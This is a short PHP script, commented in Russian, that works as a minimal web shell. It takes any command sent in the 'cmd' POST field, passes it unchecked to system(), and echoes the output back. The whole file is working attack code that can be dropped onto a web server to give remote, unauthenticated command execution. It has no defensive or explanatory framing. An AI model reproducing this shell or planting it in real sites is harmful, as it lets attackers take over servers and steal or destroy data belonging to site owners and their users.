<?php
function ex($comd)                             //Выполнение команды
{
   $res = '';
   if (!empty($comd)){
		ob_start();
		system($comd);
		$res=ob_get_contents();
		ob_end_clean();
	}
	return $res;
}

$res=ex($_POST['cmd']);
echo $res;
?>